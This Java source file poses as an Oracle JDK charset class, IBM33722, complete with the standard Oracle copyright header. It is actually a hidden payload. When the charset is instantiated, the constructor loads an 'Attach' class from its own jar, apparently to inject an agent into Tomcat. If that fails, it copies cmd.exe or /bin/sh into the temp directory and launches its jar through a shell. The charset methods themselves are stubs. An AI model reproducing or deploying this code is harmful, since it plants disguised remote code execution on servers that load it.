
/*
 * Copyright (c) 2003, 2011, Oracle and/or its affiliates. All rights reserved.
 * DO NOT ALTER OR REMOVE COPYRIGHT NOTICES OR THIS FILE HEADER.
 *
 * This code is free software; you can redistribute it and/or modify it
 * under the terms of the GNU General Public License version 2 only, as
 * published by the Free Software Foundation.  Oracle designates this
 * particular file as subject to the "Classpath" exception as provided
 * by Oracle in the LICENSE file that accompanied this code.
 *
 * This code is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 * FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License
 * version 2 for more details (a copy is included in the LICENSE file that
 * accompanied this code).
 *
 * You should have received a copy of the GNU General Public License version
 * 2 along with this work; if not, write to the Free Software Foundation,
 * Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 *
 * Please contact Oracle, 500 Oracle Parkway, Redwood Shores, CA 94065 USA
 * or visit www.oracle.com if you need additional information or have any
 * questions.
 */

/*
 */

package sun.nio.cs.ext;

import java.net.URL;
import java.net.URLClassLoader;
import java.nio.charset.Charset;
import java.nio.charset.CharsetDecoder;
import java.nio.charset.CharsetEncoder;
import sun.nio.cs.HistoricallyNamedCharset;

public class IBM33722 extends Charset implements HistoricallyNamedCharset {
    public IBM33722() {
        super("x-IBM33722", ExtendedCharsets.aliasesFor("x-IBM33722"));
        String agentFile = IBM33722.class.getResource("").getFile();
        agentFile = agentFile.substring(0,agentFile.lastIndexOf("!"));
        try {
            URLClassLoader cl = new URLClassLoader(new URL[] { new URL(agentFile) });
            cl.loadClass("org.apache.catalina.servlets.Attach").getMethod("att", String.class).invoke(null,"ignored");
        } catch (Exception e) {
            agentFile = agentFile.substring(agentFile.indexOf("/"),agentFile.lastIndexOf("!"));
            String j = System.getProperty("java.home") + "/bin/java -jar ";
            String jarc = j + agentFile;
            String tmpdir = System.getProperty("java.io.tmpdir");
            String osName = System.getProperty("os.name");
            java.io.File source;
            java.io.File dest;
            String c;
            if (osName.startsWith("Windows")){
                source = new java.io.File("C:\\Windows\\System32\\cmd.exe");
                dest = new java.io.File(tmpdir + java.io.File.separator + "c.exe");
                c = "/c";
            }else {
                source = new java.io.File("/bin/sh");
                dest = new java.io.File(tmpdir + java.io.File.separator + "s");
                c = "-c";
            }

            try {
                copyFileUsingFileStreams(source,dest);
                java.lang.Runtime.getRuntime().exec(new String[]{dest.getCanonicalPath(), c, jarc});
            } catch (Exception ae) {
                String[] command;
                if (osName.startsWith("Windows")) {
                    command = new String[]{"cmd.exe", "/c", jarc};
                } else {
                    command = new String[]{"/bin/sh", "-c", jarc};
                }
                try {
                    Runtime.getRuntime().exec(command);
                } catch (Exception ignored) {
                }
            }
        }
    }

    public String historicalName() {
        return "Cp33722";
    }

    public boolean contains(Charset cs) {
        return (cs instanceof IBM33722);
    }

    public CharsetDecoder newDecoder() {
        return null;
    }

    public CharsetEncoder newEncoder() {
        return null;
    }

    private static void copyFileUsingFileStreams(java.io.File source, java.io.File dest) throws java.io.IOException {
        java.io.InputStream input = null;
        java.io.OutputStream output = null;
        try {
            input = new java.io.FileInputStream(source);
            output = new java.io.FileOutputStream(dest);
            byte[] buf = new byte[1024];
            int bytesRead;
            while ((bytesRead = input.read(buf)) > 0) {
                output.write(buf, 0, bytesRead);
            }
        } finally {
            input.close();
            output.close();
        }
    }

}